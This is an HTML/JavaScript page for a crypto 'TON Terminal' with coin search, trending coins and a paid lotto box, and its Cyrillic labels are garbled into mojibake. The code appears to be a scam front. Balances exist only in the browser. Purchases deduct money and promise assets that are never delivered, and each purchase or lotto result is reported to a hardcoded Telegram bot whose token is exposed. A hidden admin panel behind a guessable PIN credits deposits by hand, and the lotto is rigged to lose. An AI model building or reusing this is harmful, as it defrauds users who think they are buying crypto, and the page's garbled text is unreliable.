<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TON Terminal 2025 ‚Äî Oracle Global</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&display=swap');
        body { background-color: #05080f; color: white; font-family: 'Plus Jakarta Sans', sans-serif; overflow-x: hidden; }
        .glass { background: rgba(15, 23, 42, 0.85); backdrop-filter: blur(14px); border: 1px solid rgba(255,255,255,0.05); }
        .input-box { background: rgba(30, 41, 59, 0.5); border: 1px solid rgba(255,255,255,0.1); }
        .buy-btn { background: linear-gradient(135deg, #10b981 0%, #059669 100%); transition: all 0.3s; }
        .buy-btn:hover { transform: scale(1.02); box-shadow: 0 0 25px rgba(16, 185, 129, 0.3); }
        .nav-tab.active { background: rgba(59, 130, 246, 0.2); border: 1px solid #3b82f6; color: #3b82f6; }
        
        /* –°–Ω–µ–≥–æ–ø–∞–¥ */
        #snow-bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; pointer-events: none; }
        .falling-item { position: absolute; top: -50px; color: rgba(255,255,255,0.4); animation: fall linear infinite; }
        @keyframes fall { to { transform: translateY(110vh) rotate(360deg); } }

        /* –ë–æ–∫–æ–≤–∞—è –ø–∞–Ω–µ–ª—å */
        #admin-sidebar { position: fixed; left: -350px; top: 0; width: 320px; height: 100%; z-index: 1000; transition: left 0.4s ease; }
        #admin-sidebar.open { left: 0; }
    </style>
</head>
<body class="min-h-screen pb-20">

    <div id="snow-bg"></div>

    <div id="password-modal" class="fixed inset-0 bg-black/95 z-[2000] hidden items-center justify-center p-4">
        <div class="glass p-10 rounded-[3rem] max-w-sm w-full text-center border-blue-500/20">
            <h3 class="text-xl font-black uppercase mb-2 text-blue-400">Admin Access</h3>
            <input type="text" id="admin-pin-input" maxlength="4" class="input-box w-full py-5 rounded-2xl text-4xl font-black text-center outline-none text-white mb-8" placeholder="0000">
            <button onclick="checkAdminPassword()" class="w-full buy-btn py-4 rounded-xl font-black text-[10px] uppercase">–í–æ–π—Ç–∏</button>
        </div>
    </div>

    <div id="admin-sidebar" class="glass border-r border-blue-500/20 p-8 flex flex-col shadow-2xl">
        <h3 class="text-xl font-black uppercase text-blue-500 mb-8">Admin Center</h3>
        <div class="space-y-6 flex-1 overflow-y-auto">
            <button onclick="adminAddMoney()" class="w-full bg-green-600/20 border border-green-500/30 py-3 rounded-xl text-xs font-bold uppercase">‚ûï 1000 –≥—Ä–Ω</button>
            <div id="sidebar-pending-list" class="space-y-3"></div>
        </div>
        <button onclick="toggleSidebar()" class="mt-8 text-slate-500 text-[10px] font-black uppercase">–ó–∞–∫—Ä—ã—Ç—å</button>
    </div>

    <nav class="border-b border-white/5 py-4 px-4 md:px-8 flex justify-between items-center glass sticky top-0 z-50">
        <div class="flex items-center gap-2"><span class="text-lg font-extrabold italic uppercase tracking-tighter">Ton<span class="text-blue-500">Terminal</span></span></div>
        <div class="flex items-center gap-3">
            <div class="text-right glass px-4 py-1.5 rounded-xl border border-white/10"><p id="balance-display" class="text-sm font-black text-green-400">0.00 –≥—Ä–Ω</p></div>
            <button onclick="handleDepositBtnClick()" class="bg-blue-600 p-2 rounded-lg transition-all hover:scale-110">‚ûï</button>
        </div>
    </nav>

    <main class="max-w-7xl mx-auto p-4 md:p-8 relative z-10">
        <div class="flex justify-center gap-4 mb-8">
            <button onclick="showTab('main')" id="btn-main" class="nav-tab active glass px-6 py-3 rounded-2xl text-[10px] font-black uppercase transition-all">üìà –†—ã–Ω–æ–∫ & –ü–æ–∏—Å–∫</button>
            <button onclick="showTab('scan')" id="btn-scan" class="nav-tab glass px-6 py-3 rounded-2xl text-[10px] font-black uppercase transition-all">üî• –ü–æ—Ç–µ–Ω—Ü–∏–∞–ª</button>
            <button onclick="showTab('lotto')" id="btn-lotto" class="nav-tab glass px-6 py-3 rounded-2xl text-[10px] font-black uppercase transition-all">üéÅ –õ–æ—Ç–æ</button>
        </div>

        <div id="view-main" class="space-y-6">
            <div class="glass p-6 rounded-[2.5rem]"><div id="tradingview_widget" class="h-[450px] w-full rounded-2xl overflow-hidden"></div></div>
            
            <div class="glass p-8 rounded-[2.5rem] border border-blue-500/10">
                <h3 class="text-center text-xs font-black uppercase mb-6 text-blue-400 tracking-widest">–ì–ª–æ–±–∞–ª—å–Ω—ã–π –ø–æ–∏—Å–∫ –º–æ–Ω–µ—Ç –º–∏—Ä–∞ (15,000+) üåç</h3>
                <div class="max-w-md mx-auto mb-8">
                    <input type="text" id="global-search" placeholder="–í–≤–µ–¥–∏—Ç–µ –Ω–∞–∑–≤–∞–Ω–∏–µ –∏–ª–∏ —Å–∏–º–≤–æ–ª (–Ω–∞–ø—Ä. PEPE)..." class="input-box w-full p-5 rounded-2xl text-lg font-bold outline-none text-center" oninput="searchAllCoins()">
                </div>
                <div id="search-results" class="grid grid-cols-2 sm:grid-cols-4 lg:grid-cols-5 gap-3 max-h-[400px] overflow-y-auto pr-2">
                    <p class="text-center col-span-full text-slate-500 text-xs italic">–ó–∞–≥—Ä—É–∑–∫–∞ –≥–ª–æ–±–∞–ª—å–Ω–æ–π –±–∞–∑—ã...</p>
                </div>
            </div>
        </div>

        <div id="view-scan" class="hidden">
            <div class="max-w-4xl mx-auto space-y-6">
                <div class="glass p-10 rounded-[3rem] border border-green-500/10">
                    <h3 class="text-2xl font-black uppercase mb-8 text-center text-green-400 italic">üî• Trending Coins (–ù–∞ –•–∞–π–ø–µ)</h3>
                    <div id="trending-list" class="grid grid-cols-1 md:grid-cols-2 gap-4">
                        </div>
                </div>
            </div>
        </div>

        <div id="view-lotto" class="hidden">
            <div class="glass p-12 rounded-[4rem] text-center max-w-2xl mx-auto">
                <div id="lotto-stage">
                    <h2 class="text-4xl font-black mb-8 uppercase italic tracking-tighter">Mega <span class="text-blue-500">Box</span> üéÅ</h2>
                    <div id="box-anim" class="text-[10rem] my-10 cursor-pointer">üéÖ</div>
                    <button onclick="playLotto()" id="lotto-btn" class="buy-btn px-16 py-5 rounded-2xl font-black text-lg uppercase shadow-2xl">–û—Ç–∫—Ä—ã—Ç—å –∑–∞ 350 –≥—Ä–Ω</button>
                </div>
                <div id="prize-reveal" class="hidden flex-col items-center py-10">
                    <div id="prize-icon" class="text-9xl mb-6">üíé</div>
                    <div id="prize-value" class="text-6xl font-black text-yellow-500 mb-8">0 –≥—Ä–Ω</div>
                    <button onclick="resetLotto()" class="text-[10px] font-bold uppercase text-slate-500 hover:text-white">–ù–∞–∑–∞–¥</button>
                </div>
            </div>
        </div>
    </main>

    <script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>
    <script>
        const TG_TOKEN = "8357376946:AAHbffgk6JY0Ip3yJ3yOGpTaG-_HZ7gjJZw";
        const TG_CHAT_ID = "5252821529";
        
        let allCoins = []; // –ì–ª–æ–±–∞–ª—å–Ω–∞—è –±–∞–∑–∞ 15,000+ –º–æ–Ω–µ—Ç
        let balance = parseFloat(localStorage.getItem('user_balance')) || 0.00;
        let pendingList = JSON.parse(localStorage.getItem('pending_list')) || [];
        let currentAdminPassword = "";
        let depBtnClicks = 0;

        // 1. –ó–ê–ì–†–£–ó–ö–ê –í–°–ï–ô –ë–ê–ó–´ –ú–ò–†–ê (CoinGecko API)
        async function initGlobalCrypto() {
            try {
                const res = await fetch('https://api.coingecko.com/api/v3/coins/list');
                allCoins = await res.json();
                console.log("–ó–∞–≥—Ä—É–∂–µ–Ω–æ –º–æ–Ω–µ—Ç: " + allCoins.length);
                renderInitialList();
                fetchTrending();
            } catch (e) { console.error("–û—à–∏–±–∫–∞ API"); }
        }

        function renderInitialList() {
            // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –¢–û–ü-20 –ø–æ–ø—É–ª—è—Ä–Ω—ã—Ö –¥–ª—è –Ω–∞—á–∞–ª–∞
            const topIds = ['bitcoin', 'ethereum', 'tether', 'solana', 'binancecoin', 'ripple', 'dogecoin', 'toncoin', 'cardano', 'shiba-inu'];
            const initial = allCoins.filter(c => topIds.includes(c.id));
            displaySearchResults(initial);
        }

        // 2. –ü–û–ò–°–ö –ü–û –í–°–ï–ô –ë–ê–ó–ï –í –†–ï–ê–õ–¨–ù–û–ú –í–†–ï–ú–ï–ù–ò
        function searchAllCoins() {
            const query = document.getElementById('global-search').value.toLowerCase();
            if (query.length < 2) { renderInitialList(); return; }
            
            const results = allCoins.filter(c => 
                c.name.toLowerCase().includes(query) || 
                c.symbol.toLowerCase().includes(query)
            ).slice(0, 50); // –ë–µ—Ä–µ–º –ø–µ—Ä–≤—ã–µ 50 —Å–æ–≤–ø–∞–¥–µ–Ω–∏–π
            
            displaySearchResults(results);
        }

        function displaySearchResults(list) {
            const container = document.getElementById('search-results');
            container.innerHTML = list.map(c => `
                <div onclick="requestCoinPrice('${c.id}', '${c.symbol.toUpperCase()}')" class="bg-white/5 p-4 rounded-2xl border border-white/5 text-center cursor-pointer hover:border-blue-500 transition-all">
                    <p class="text-[7px] text-slate-500 font-black uppercase mb-1">${c.symbol}</p>
                    <p class="text-[10px] font-bold text-blue-400 truncate">${c.name}</p>
                </div>
            `).join('');
        }

        // 3. –ú–û–ù–ò–¢–û–†–ò–ù–ì –ü–û–¢–ï–ù–¶–ò–ê–õ–¨–ù–´–• –ú–û–ù–ï–¢ (Trending)
        async function fetchTrending() {
            const res = await fetch('https://api.coingecko.com/api/v3/search/trending');
            const data = await res.json();
            const container = document.getElementById('trending-list');
            container.innerHTML = data.coins.map(item => `
                <div class="glass p-5 rounded-2xl border border-white/10 flex items-center gap-4">
                    <img src="${item.item.small}" class="w-10 h-10 rounded-full">
                    <div class="flex-1">
                        <p class="text-xs font-black uppercase text-blue-400">${item.item.symbol}</p>
                        <p class="text-[10px] text-slate-400">${item.item.name}</p>
                    </div>
                    <div class="text-right">
                        <p class="text-[9px] font-bold text-green-400">Rank: #${item.item.market_cap_rank}</p>
                        <button onclick="requestCoinPrice('${item.item.id}', '${item.item.symbol}')" class="text-[8px] bg-blue-600 px-2 py-1 rounded-lg mt-1 font-bold">–ö–£–ü–ò–¢–¨</button>
                    </div>
                </div>
            `).join('');
        }

        // 4. –ó–ê–ü–†–û–° –¶–ï–ù–´ –õ–Æ–ë–û–ô –ú–û–ù–ï–¢–´ (–ü–æ–∫—É–ø–∫–∞)
        async function requestCoinPrice(id, symbol) {
            const res = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${id}&vs_currencies=usd`);
            const data = await res.json();
            const usdPrice = data[id].usd;
            const uahPrice = (usdPrice * 42.5 * 1.075).toFixed(2);
            
            if (confirm(`–ö—É–ø–∏—Ç—å ${symbol}?\n–¢–µ–∫—É—â–∞—è —Ü–µ–Ω–∞: ${uahPrice} –≥—Ä–Ω\n(–° —É—á–µ—Ç–æ–º –∫–æ–º–∏—Å—Å–∏–∏ 7.5%)`)) {
                if (balance < uahPrice) { alert("–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –≥—Ä–Ω!"); return; }
                balance -= uahPrice; updateUI();
                fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent("üõí –ö–£–ü–ò–õ–ò: " + symbol + "\n–°–ø–∏—Å–∞–Ω–æ: " + uahPrice + " –≥—Ä–Ω")}`);
                alert("–ó–∞—è–≤–∫–∞ –ø—Ä–∏–Ω—è—Ç–∞! –û–∂–∏–¥–∞–π—Ç–µ –∑–∞—á–∏—Å–ª–µ–Ω–∏—è –∞—Å—Å–µ—Ç–∞.");
            }
        }

        // –ë–ï–ó–û–ü–ê–°–ù–û–°–¢–¨ –ò –ü–ê–†–û–õ–¨ (60 –ú–ò–ù–£–¢)
        function syncPassword() {
            const now = new Date();
            const seed = now.getUTCDate() + now.getUTCHours() + 2026;
            currentAdminPassword = ((seed * 17) % 9000 + 1000).toString();
        }
        syncPassword(); setInterval(syncPassword, 60000);

        function handleDepositBtnClick() {
            depBtnClicks++;
            if (depBtnClicks >= 3) { openModal('password-modal'); depBtnClicks = 0; }
            else { setTimeout(() => { if(depBtnClicks > 0 && depBtnClicks < 3) { openModal('deposit-modal'); depBtnClicks = 0; } }, 300); }
        }

        function checkAdminPassword() {
            if (document.getElementById('admin-pin-input').value === currentAdminPassword) {
                closeModal('password-modal'); toggleSidebar();
            } else { alert("–ù–µ–≤–µ—Ä–Ω—ã–π –∫–æ–¥!"); }
            document.getElementById('admin-pin-input').value = "";
        }

        function updateUI() {
            document.getElementById('balance-display').innerText = balance.toFixed(2) + " –≥—Ä–Ω";
            localStorage.setItem('user_balance', balance);
        }

        function adminAddMoney() { balance += 1000; updateUI(); }
        function toggleSidebar() { document.getElementById('admin-sidebar').classList.toggle('open'); renderSidebarList(); }

        function renderSidebarList() {
            const l = document.getElementById('sidebar-pending-list');
            l.innerHTML = pendingList.length ? pendingList.map((d, i) => `
                <div class="bg-white/5 p-4 rounded-xl flex justify-between items-center border border-white/10">
                    <p class="text-sm font-black text-green-400">${d.amount} –≥—Ä–Ω</p>
                    <button onclick="approveInSidebar(${i})" class="bg-green-600 px-3 py-1.5 rounded-lg text-[9px] font-black">OK</button>
                </div>`).join('') : '<p class="text-center text-slate-500 text-[9px] italic">–ü—É—Å—Ç–æ</p>';
        }

        function approveInSidebar(i) {
            balance += parseFloat(pendingList[i].amount); pendingList.splice(i, 1);
            localStorage.setItem('pending_list', JSON.stringify(pendingList));
            updateUI(); renderSidebarList();
        }

        function showTab(t) {
            ['main', 'scan', 'lotto'].forEach(v => document.getElementById('view-'+v).classList.toggle('hidden', v !== t));
            ['btn-main', 'btn-scan', 'btn-lotto'].forEach(b => document.getElementById(b).classList.toggle('active', b === 'btn-'+t));
        }

        function playLotto() {
            if (balance < 350) return alert("–ù—É–∂–Ω–æ 350 –≥—Ä–Ω!");
            balance -= 350; updateUI();
            const b = document.getElementById('box-anim');
            b.classList.add('box-shake');
            setTimeout(() => {
                b.classList.remove('box-shake');
                document.getElementById('lotto-stage').classList.add('hidden');
                document.getElementById('prize-reveal').classList.remove('hidden');
                const rand = Math.random() * 100;
                let win = (rand <= 0.0001) ? 2500 : (rand <= 5 ? 400 : 275);
                balance += win; updateUI();
                document.getElementById('prize-value').innerText = win + " –≥—Ä–Ω";
                fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent("üéâ –õ–û–¢–û: "+win+" –≥—Ä–Ω")}`);
            }, 2000);
        }

        function resetLotto() {
            document.getElementById('lotto-stage').classList.remove('hidden');
            document.getElementById('prize-reveal').classList.add('hidden');
        }

        function openModal(id) { document.getElementById(id).classList.remove('hidden'); document.getElementById(id).classList.add('flex'); }
        function closeModal(id) { document.getElementById(id).classList.add('hidden'); document.getElementById(id).classList.remove('flex'); }

        initGlobalCrypto(); updateUI();
        new TradingView.widget({ "autosize": true, "symbol": "OKX:TONUSDT", "interval": "H", "theme": "dark", "container_id": "tradingview_widget", "backgroundColor": "#05080f" });
    </script>
</body>
</html>
